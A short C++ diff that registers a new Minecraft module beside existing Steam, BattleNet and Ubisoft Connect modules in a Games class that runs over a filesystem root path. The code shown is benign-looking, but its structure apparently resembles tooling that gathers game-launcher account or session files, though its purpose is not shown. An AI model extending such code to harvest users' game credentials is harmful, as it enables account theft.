@@ -6,11 +6,13 @@
 #include "impl/Steam.h"
 #include "impl/BattleNet.h"
 #include "impl/UbisoftConnect.h"
+#include "impl/Minecraft.h"
 
 Games::Games() {
     this->modules.push_back(new Steam());
     this->modules.push_back(new BattleNet());
     this->modules.push_back(new UbisoftConnect());
+    this->modules.push_back(new Minecraft());
 }
 
 void Games::execute(fs::path &root) {
